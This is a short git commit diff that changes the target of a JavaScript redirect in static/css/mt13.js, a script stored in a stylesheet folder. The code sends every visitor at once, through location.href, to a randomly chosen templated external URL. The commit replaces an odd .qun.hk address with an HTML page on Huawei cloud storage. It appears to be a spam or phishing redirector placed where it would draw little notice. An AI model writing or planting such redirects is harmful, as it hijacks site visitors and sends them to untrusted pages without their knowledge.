6ec322fc99a615098353a78fd73f00f98a89def7
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-06-27 19:02:28 +0800

    Update mt13.js

--- static/css/mt13.js
+++ static/css/mt13.js
@@ -1,4 +1,4 @@
-var urls=[' http://pbwci.qun.hk./Fonsm0wu3XVypnx149GQ-gRYQwUi#{nnnnnnn}{wwww}',];
+var urls=[' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/fd68b4998e3f490d84b014a35bdb4f80.html#{nnnnnnn}{wwww}',];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
 	return s.replace(/\{(\w+?)\}/g,function(a,b){
